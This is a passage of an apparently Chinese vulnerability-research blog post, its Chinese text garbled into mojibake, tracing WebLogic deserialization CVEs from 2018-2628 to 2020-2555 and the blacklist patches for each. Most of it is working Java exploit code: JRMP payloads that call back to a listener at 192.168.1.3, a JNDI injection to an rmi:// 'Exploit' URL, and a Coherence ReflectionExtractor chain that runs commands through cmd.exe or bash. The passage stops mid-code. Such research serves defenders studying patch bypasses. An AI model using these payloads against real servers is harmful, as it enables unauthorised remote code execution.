class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> ysoserial.payloads;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.server.ObjID;</span><br><span class="line"><span class="keyword">import</span> java.util.Random;</span><br><span class="line"><span class="keyword">import</span> sun.rmi.server.UnicastRef;</span><br><span class="line"><span class="keyword">import</span> sun.rmi.transport.LiveRef;</span><br><span class="line"><span class="keyword">import</span> sun.rmi.transport.tcp.TCPEndpoint;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.annotation.Authors;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.annotation.PayloadTest;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.util.PayloadRunner;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@SuppressWarnings</span> ( &#123;</span><br><span class="line">    <span class="string">"restriction"</span></span><br><span class="line">&#125; )</span><br><span class="line"><span class="meta">@PayloadTest</span>( harness=<span class="string">"ysoserial.test.payloads.JRMPReverseConnectSMTest"</span>)</span><br><span class="line"><span class="meta">@Authors</span>(&#123; Authors.MBECHLER &#125;)</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JRMPClient2</span> <span class="keyword">extends</span> <span class="title">PayloadRunner</span> <span class="keyword">implements</span> <span class="title">ObjectPayload</span>&lt;<span class="title">UnicastRef</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> UnicastRef <span class="title">getObject</span> <span class="params">( <span class="keyword">final</span> String command )</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">        String host;</span><br><span class="line">        <span class="keyword">int</span> port;</span><br><span class="line">        <span class="keyword">int</span> sep = command.indexOf(<span class="string">':'</span>);</span><br><span class="line">        <span class="keyword">if</span> ( sep &lt; <span class="number">0</span> ) &#123;</span><br><span class="line">            port = <span class="keyword">new</span> Random().nextInt(<span class="number">65535</span>);</span><br><span class="line">            host = command;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            host = command.substring(<span class="number">0</span>, sep);</span><br><span class="line">            port = Integer.valueOf(command.substring(sep + <span class="number">1</span>));</span><br><span class="line">        &#125;</span><br><span class="line">        ObjID id = <span class="keyword">new</span> ObjID(<span class="keyword">new</span> Random().nextInt()); <span class="comment">// RMI registry</span></span><br><span class="line">        TCPEndpoint te = <span class="keyword">new</span> TCPEndpoint(host, port);</span><br><span class="line">        UnicastRef ref = <span class="keyword">new</span> UnicastRef(<span class="keyword">new</span> LiveRef(id, te, <span class="keyword">false</span>));</span><br><span class="line">        <span class="keyword">return</span> ref;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span> <span class="params">( <span class="keyword">final</span> String[] args )</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Thread.currentThread().setContextClassLoader(JRMPClient<span class="class">.<span class="keyword">class</span>.<span class="title">getClassLoader</span>())</span>;</span><br><span class="line">        PayloadRunner.run(JRMPClient<span class="class">.<span class="keyword">class</span>, <span class="title">args</span>)</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="CVE-2018-2628çš„ä¿®å¤"><a href="#CVE-2018-2628çš„ä¿®å¤" class="headerlink" title="CVE-2018-2628çš„ä¿®å¤"></a>CVE-2018-2628çš„ä¿®å¤</h2><p>è¡¥ä¸ï¼š2018å¹´å››æœˆå‘å¸ƒçš„p27395085_1036_Generic<br>UnicastRefåœ¨weblogic.utils.io.oif.WebLogicFilterConfigä¸­åŠ è¿›äº†é»‘åå•ã€‚<br><img src="1584698130591-207644b4-ca01-41d7-aaa6-a38737075255.png" alt="image.png"></p><h2 id="CVE-2018-2893"><a href="#CVE-2018-2893" class="headerlink" title="CVE-2018-2893"></a>CVE-2018-2893</h2><p>streamMessageImpl + jrmpä»£ç†ç±»ç»•è¿‡ã€‚å…ˆæ¥çœ‹payload</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sun.rmi.server.UnicastRef;</span><br><span class="line"><span class="keyword">import</span> sun.rmi.transport.LiveRef;</span><br><span class="line"><span class="keyword">import</span> sun.rmi.transport.tcp.TCPEndpoint;</span><br><span class="line"><span class="keyword">import</span> weblogic.jms.common.StreamMessageImpl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.ObjID;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.RemoteObjectInvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.util.Random;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CVE_2018_2893</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        ObjID objID = <span class="keyword">new</span> ObjID(<span class="keyword">new</span> Random().nextInt()); <span class="comment">// RMI registry</span></span><br><span class="line">        TCPEndpoint tcpEndpoint = <span class="keyword">new</span> TCPEndpoint(<span class="string">"192.168.1.3"</span>, <span class="number">8080</span>);</span><br><span class="line">        UnicastRef unicastRef = <span class="keyword">new</span> UnicastRef(<span class="keyword">new</span> LiveRef(objID, tcpEndpoint, <span class="keyword">false</span>));</span><br><span class="line">        RemoteObjectInvocationHandler remoteObjectInvocationHandler = <span class="keyword">new</span> RemoteObjectInvocationHandler(unicastRef);</span><br><span class="line">        Object object = Proxy.newProxyInstance(Thread.currentThread().getContextClassLoader(), <span class="keyword">new</span> Class[] &#123; Registry<span class="class">.<span class="keyword">class</span> &#125;, <span class="title">remoteObjectInvocationHandler</span>)</span>;</span><br><span class="line">        StreamMessageImpl streamMessage = <span class="keyword">new</span> StreamMessageImpl(serialize(object));</span><br><span class="line">        ser(streamMessage, <span class="string">"CVE_2018_2893.ser"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">ser</span><span class="params">(Object obj, String serName)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        File file = <span class="keyword">new</span> File(serName);</span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(file));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">        System.out.println(<span class="string">"-------åºåˆ—åŒ–æˆåŠŸ"</span> + serName);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">byte</span>[] serialize(<span class="keyword">final</span> Object obj) <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="keyword">final</span> ByteArrayOutputStream out = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        serialize(obj, out);</span><br><span class="line">        <span class="keyword">return</span> out.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">serialize</span><span class="params">(<span class="keyword">final</span> Object obj, <span class="keyword">final</span> OutputStream out)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        <span class="keyword">final</span> ObjectOutputStream objOut = <span class="keyword">new</span> ObjectOutputStream(out);</span><br><span class="line">        objOut.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä»€ä¹ˆé¬¼ï¼Ÿpayloadä¸­ç”¨åˆ°çš„streamMessageImplã€Registryã€UnicastRefä¸æ˜¯å·²ç»è¢«ä¿®å¤äº†å—ï¼Ÿ</p><p>æˆ‘ä»¬æ¥ç»†çœ‹ä¸€ä¸‹æ€ä¹ˆä¿®çš„ã€‚<br>streamMessageImplçš„readExternalå†…éƒ¨æ˜¯æ‹¿ç»™FilteringObjectInputStreamè¿‡æ»¤ã€‚<br><img src="1584710908628-4d0c2a6d-e1b7-4228-a3cb-9d524c3ab646.png" alt="image.png"></p><p>FilteringObjectInputStreamåªæ˜¯å¯¹æ™®é€šç±»çš„ååºåˆ—åŒ–è¿›è¡Œäº†æ‹¦æˆªï¼Œ<strong>å¹¶æ²¡æœ‰å¯¹ä»£ç†ç±»è¿›è¡Œæ‹¦æˆª</strong>ã€‚å¯¹ä½ æ²¡çœ‹é”™ï¼Œè™½ç„¶åœ¨CVE-2017-3248åServerChannelInoutStreamç±»ä¸­çš„resolveProxyClassè¿‡æ»¤äº†Registryï¼Œä½†æ˜¯è¿™é‡Œçš„FilteringObjectInputStreamå¹¶æ²¡æœ‰å®ç°resolveProxyClassè¿‡æ»¤ä»£ç†ç±»ã€‚<br><img src="1584710976177-97024508-c398-4f6e-b4eb-21a5de7eea5b.png" alt="image.png"></p><p>é‚£UnicastRefåˆä¸ºå•¥é€ƒè¿‡ä¸€åŠ«ï¼Ÿæˆ‘ä»¬æ¥çœ‹UnicastRefåœ¨åºåˆ—åŒ–çš„æ—¶å€™ç»å†äº†ä»€ä¹ˆã€‚åœ¨ä¸Šé¢çš„payloadä¸­UnicastRefä¼ å…¥äº†RemoteObjectInvocationHandlerï¼ŒRemoteObjectInvocationHandlerç»§æ‰¿è‡ªRemoteObjectã€‚åœ¨RemoteObject writeObjectæ—¶åªæ˜¯å†™å…¥UnicastRefçš„ç±»åï¼ˆå¹¶æ²¡æœ‰æŠŠä»–ä½œä¸ºä¸€ä¸ªç±»åºåˆ—åŒ–ï¼‰ç„¶åè°ƒç”¨UnicastRefçš„writeExternalã€‚<br><img src="1584860540228-fe6c0a00-c540-4adb-ba28-95f78f6c6526.png" alt="image.png"></p><p>UnicastRefåˆç”¨åˆ°äº†LiveRefçš„writeï¼Œå†™å…¥äº†ååºåˆ—åŒ–æ—¶éœ€è¦åè¿çš„hostå’Œç«¯å£ã€‚<br><img src="1584860611067-35091a96-92e1-4880-af99-1a41df05c038.png" alt="image.png"></p><p><strong><img src="1584860770547-7e1eb9b8-1a60-46df-8176-0babe48b29ec.png" alt="image.png"></strong><br><strong>ç”±æ­¤å¯è§UnicastRefä»å§‹è‡³ç»ˆå¹¶æ²¡æœ‰ä½œä¸ºä¸€ä¸ªç±»è¢«ååºåˆ—åŒ–</strong>ï¼Œå¦‚æœåˆ†æè¿™ä¸ªpayloadçš„resolve<em>æ—¶åºä¼šå‘ç°å®Œå…¨æ²¡æœ‰ååºåˆ—åŒ–UnicastRefã€‚<img src="1584757419567-e05e2bad-6864-4b2a-8808-ea680f0b396a.png" alt="image.png"><br>å¦‚æœä½ åˆ†æåºåˆ—åŒ–å‡ºæ¥çš„æ•°æ®ä¼šå‘ç°*</em>UnicastRef**åªæ˜¯TC_BLOCKDATAè€Œä¸æ˜¯TC_CLASSDESCã€‚<br><img src="1584802424702-8c273e78-5144-4cf4-8508-9791166c0aeb.png" alt="image.png"></p><h2 id="CVE-2018-2893çš„ä¿®å¤"><a href="#CVE-2018-2893çš„ä¿®å¤" class="headerlink" title="CVE-2018-2893çš„ä¿®å¤"></a>CVE-2018-2893çš„ä¿®å¤</h2><p>è¡¥ä¸ï¼š18å¹´7æœˆ p27919965_1036_Generic<br>è¿™æ¬¡ä¿®å¤æŠŠç»è¿‡resolveClassçš„java.rmi.server.RemoteObjectInvocationHandlerç»™è¿‡æ»¤äº†ã€‚<br><img src="1584757380169-c0e94533-c304-4b2b-92f4-5328df54978c.png" alt="image.png"></p><h2 id="CVE-2018-3245"><a href="#CVE-2018-3245" class="headerlink" title="CVE-2018-3245"></a>CVE-2018-3245</h2><p>å†æ¬¡å¼•ç”¨@<strong><a href="https://xz.aliyun.com/u/4522">lpwd</a>å¸ˆå‚…çš„è¯ï¼š</strong></p><blockquote><p>æ ¹æ®å‰é¢çš„åˆ†æå¯çŸ¥ï¼Œæˆ‘ä»¬åªéœ€è¦æ‰¾ä¸€ä¸ªç±»ä¼¼java.rmi.server.RemoteObjectInvocationHandlerçš„ç±»è¿›è¡Œæ›¿æ¢ï¼Œå°±èƒ½ç»§ç»­ç»•è¿‡äº†ã€‚<br>é‚£ä¹ˆè¿™ä¸ªç±»åº”è¯¥æ»¡è¶³ä»¥ä¸‹æ¡ä»¶ï¼š<br>ç»§æ‰¿è¿œç¨‹ç±»ï¼šjava.rmi.server.RemoteObject<br>ä¸åœ¨é»‘åå•é‡Œè¾¹ï¼ˆjava.rmi.activation. ã€sun.rmi.server.ï¼‰<br>éšä¾¿æ‰¾äº†ä¸€ä¸‹ï¼Œç¬¦åˆæ¡ä»¶çš„æŒºå¤šçš„ï¼š<br>javax.management.remote.rmi.RMIConnectionImpl_Stub<br>com.sun.jndi.rmi.registry.ReferenceWrapper_Stub<br>javax.management.remote.rmi.RMIServerImpl_Stub<br>sun.rmi.registry.RegistryImpl_Stub<br>sun.rmi.transport.DGCImpl_Stub</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper_Stub;</span><br><span class="line"><span class="keyword">import</span> sun.rmi.server.UnicastRef;</span><br><span class="line"><span class="keyword">import</span> sun.rmi.transport.LiveRef;</span><br><span class="line"><span class="keyword">import</span> sun.rmi.transport.tcp.TCPEndpoint;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.ObjID;</span><br><span class="line"><span class="keyword">import</span> java.util.Random;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CVE_2018_3245</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        ObjID id = <span class="keyword">new</span> ObjID(<span class="keyword">new</span> Random().nextInt()); <span class="comment">// RMI registry</span></span><br><span class="line">        TCPEndpoint te = <span class="keyword">new</span> TCPEndpoint(<span class="string">"192.168.1.3"</span>, <span class="number">8080</span>);</span><br><span class="line">        UnicastRef ref = <span class="keyword">new</span> UnicastRef(<span class="keyword">new</span> LiveRef(id, te, <span class="keyword">false</span>));</span><br><span class="line">        ReferenceWrapper_Stub wrapperStub = <span class="keyword">new</span> ReferenceWrapper_Stub(ref);</span><br><span class="line">        ser(wrapperStub, <span class="string">"CVE_2018_3245.ser"</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">ser</span><span class="params">(Object obj, String serName)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        File file = <span class="keyword">new</span> File(serName);</span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(file));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">        System.out.println(<span class="string">"-------åºåˆ—åŒ–æˆåŠŸ"</span> + serName);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="CVE-2018-3245çš„ä¿®å¤"><a href="#CVE-2018-3245çš„ä¿®å¤" class="headerlink" title="CVE-2018-3245çš„ä¿®å¤"></a>CVE-2018-3245çš„ä¿®å¤</h2><p>è¡¥ä¸ï¼š2018å¹´8æœˆ p28343311_1036_201808Generic<br>ä¿®å¤æ–¹æ³•æ˜¯æ·»åŠ æ›´åº•å±‚çš„java.rmi.server.RemoteObjectã€‚<br><img src="1584798148125-7379c092-e2f9-443f-8ad2-26abcf8c8c47.png" alt="image.png"></p><h2 id="CVE-2018-3191"><a href="#CVE-2018-3191" class="headerlink" title="CVE-2018-3191"></a>CVE-2018-3191</h2><p>è¿™ä¸ªæ´æ˜¯jndiæ³¨å…¥ã€‚è§¦å‘ç‚¹åœ¨JtaTransactionManagerã€‚<br><img src="1584798618333-e4e39d89-ee25-4e2f-802a-ab5bf2599308.png" alt="image.png"></p><p><img src="1584798640381-5944e195-96af-4641-b0a9-cdf087c6a654.png" alt="image.png"></p><p><img src="1584798722915-cfb87146-35f9-438d-925c-41a52ae90838.png" alt="image.png"></p><p><img src="1584798761013-542d6fd5-8920-4078-9493-4b7c7c5f2741.png" alt="image.png"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.bea.core.repackaged.springframework.transaction.jta.JtaTransactionManager;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CVE_2018_3191</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        String jndiAddress = <span class="string">"rmi://192.168.1.3:1099/Exploit"</span>;</span><br><span class="line">        JtaTransactionManager jtaTransactionManager = <span class="keyword">new</span> JtaTransactionManager();</span><br><span class="line">        jtaTransactionManager.setUserTransactionName(jndiAddress);</span><br><span class="line">        ser(jtaTransactionManager, <span class="string">"CVE_2018_3191.ser"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">ser</span><span class="params">(Object obj, String serName)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        File file = <span class="keyword">new</span> File(serName);</span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(file));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">        System.out.println(<span class="string">"-------åºåˆ—åŒ–æˆåŠŸ"</span> + serName);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="CVE-2018-3191çš„ä¿®å¤"><a href="#CVE-2018-3191çš„ä¿®å¤" class="headerlink" title="CVE-2018-3191çš„ä¿®å¤"></a>CVE-2018-3191çš„ä¿®å¤</h2><p>è¡¥ä¸ï¼š2018å¹´8æœˆ p28343311_1036_Generic<br><img src="1584802019155-c6e68f15-42b1-460e-88ef-15ad5ae259dd.png" alt="image.png"></p><h2 id="CVE-2020-2555"><a href="#CVE-2020-2555" class="headerlink" title="CVE-2020-2555"></a>CVE-2020-2555</h2><p>Oracle Coherenceç»„ä»¶å­˜åœ¨æ¼æ´ï¼Œè¯¥ç»„ä»¶é»˜è®¤é›†æˆåœ¨Weblogic12cåŠä»¥ä¸Šç‰ˆæœ¬ä¸­ï¼ˆç½‘ä¸Šèµ„æ–™è¿™ä¹ˆè¯´çš„ï¼šweb10.3.6ä¹Ÿæœ‰åªæ˜¯é»˜è®¤æ²¡æœ‰å¯ç”¨ï¼ŒæœªéªŒè¯ï¼‰ã€‚<br>è¿™ä¸ªæ¼æ´å’Œcc5çš„æ„é€ æœ‰å¼‚æ›²åŒå·¥ä¹‹å¦™ï¼Œè§¦å‘ç‚¹åœ¨BadAttributeValueExpException#readObject ä¸­è°ƒç”¨toStringæ–¹æ³•ã€‚<br><img src="1585031019146-eae01e8a-459f-4c4e-8721-5cf71ee4cf96.png" alt="image.png"><br>åœ¨Coherenceç»„ä»¶ä¸­LimitFilterè¿™ä¸ªç±»åˆšå¥½å¯ä»¥è¢«åºåˆ—åŒ–å¹¶ä¸”æœ‰toStringè¿™ä¸ªæ–¹æ³•ã€‚å› ä¸ºæ˜¯ååºåˆ—åŒ–ï¼Œthis.m_comparatorå’Œthis.m_oAnchorBottoméƒ½å¯æ§ã€‚ä¹Ÿå°±è¯´<code>extractor.extract(``this``.m_oAnchorBottom)</code>å®Œå…¨å¯æ§(æ›´ä¸¥æ ¼çš„è¯´m_comparatoréœ€è¦æ˜¯ValueExtractorçš„å®ä¾‹å¹¶ä¸”å’Œm_oAnchorBottoméƒ½éœ€è¦å¯è¢«åºåˆ—åŒ–)ã€‚<br><img src="1585031243642-c510f34c-79ba-4281-ad7b-7369870e4812.png" alt="image.png"><br>æˆ‘ä»¬æ¥çœ‹ä¸€ä¸‹æœ‰å“ªäº›æ»¡è¶³æ¡ä»¶çš„ç±»å®ç°äº†extractã€‚<br>å¯ä»¥æ³¨æ„åˆ°com.tangosol.util.extractor.ReflectionExtractor#extract<br><img src="1585031717014-721c2395-5fe1-40ce-8d6d-6be6af1b0058.png" alt="image.png"><br>å®ƒå¯ä»¥è¢«åºåˆ—åŒ–å¹¶ä¸”extracté‡Œé¢æ˜¯ä¸€ç»„åå°„æ“ä½œã€‚<br><img src="1585031831736-9700a25a-4236-409c-a8c3-9c6314df0bc3.png" alt="image.png"></p><p><img src="1585031809085-a6f41e3e-8971-4416-8ec0-160d44a82f80.png" alt="image.png"><br>å…¶æ¬¡æ³¨æ„åˆ°com.tangosol.util.extractor.ChainedExtractor#extract<br><img src="1585031865174-55287322-bdeb-4ddf-843d-a31557b11098.png" alt="image.png"><br>é‡Œé¢æ˜¯å¯¹extratorè¿›è¡Œé“¾å¼æ“ä½œï¼ˆå¹¶ä¸”è¿™ä¸ªç±»åŒæ ·å¯ä»¥è¢«ååºåˆ—åŒ–ï¼‰ï¼Œè¯´åˆ°è¿™é‡Œå·²ç»å¯ä»¥çœ‹å‡ºæ¥æ˜¯å’Œccé“¾ä¸€ä¸ªå¥—è·¯äº†ã€‚<br><img src="1585031899900-c0d8a1d2-e502-4829-9cf5-bda2bfc7d4c3.png" alt="image.png"></p><p>è¿™é‡Œæˆ‘æ˜¯åœ¨windowsä¸Šå¤ç°çš„ï¼ˆ<del>å¾ˆå¥‡æ€ªæˆ‘åœ¨linuxå®Œæ•´å®‰è£…æ‰“ä¸äº†ï¼Œwindowsä¸Šé»˜è®¤å®‰è£…å°±å¯ä»¥ï¼Œ</del>åæ¥å‘ç°linuxç¯å¢ƒæ˜¯7u21è¿™ä¸ªç‰ˆæœ¬çš„BadAttributeValueExpExceptionå¹¶æ²¡æœ‰readObjectæ–¹æ³•ï¼Œå¦å¤–ä¸éœ€è¦ç”¨å®Œæ•´ç¤ºä¾‹å®‰è£…é»˜è®¤å®‰è£…å³å¯ï¼‰ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.tangosol.util.ValueExtractor;</span><br><span class="line"><span class="keyword">import</span> com.tangosol.util.extractor.ChainedExtractor;</span><br><span class="line"><span class="keyword">import</span> com.tangosol.util.extractor.ReflectionExtractor;</span><br><span class="line"><span class="keyword">import</span> com.tangosol.util.filter.LimitFilter;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CVE_2020_2555</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">        <span class="comment">//String cmd = "touch /tmp/CVE_2020_2555_12013";</span></span><br><span class="line">        String cmd =<span class="string">"calc.exe"</span>;</span><br><span class="line">        ValueExtractor[] valueExtractors = <span class="keyword">new</span> ValueExtractor[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ReflectionExtractor(<span class="string">"getMethod"</span>, <span class="keyword">new</span> Object[]&#123;<span class="string">"getRuntime"</span>, <span class="keyword">new</span> Class[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> ReflectionExtractor(<span class="string">"invoke"</span>, <span class="keyword">new</span> Object[]&#123;<span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="comment">//new ReflectionExtractor("exec", new Object[]&#123;new String[]&#123;"/bin/bash", "-c", cmd&#125;&#125;)</span></span><br><span class="line">                <span class="keyword">new</span> ReflectionExtractor(<span class="string">"exec"</span>, <span class="keyword">new</span> Object[]&#123;<span class="keyword">new</span> String[]&#123;<span class="string">"cmd.exe"</span>, <span class="string">"/c"</span>, cmd&#125;&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">// chain</span></span><br><span class="line">        LimitFilter limitFilter = <span class="keyword">new</span> LimitFilter();</span><br><span class="line">        limitFilter.setTopAnchor(Runtime<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">        BadAttributeValueExpException expException = <span class="keyword">new</span> BadAttributeValueExpException(<span class="keyword">null</span>);</span><br><span class="line">        Field m_comparator = limitFilter.getClass().getDeclaredField(<span class="string">"m_comparator"</span>);</span><br><span class="line">        m_comparator.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        m_comparator.set(limitFilter, <span class="keyword">new</span> ChainedExtractor(valueExtractors));</span><br><span class="line">        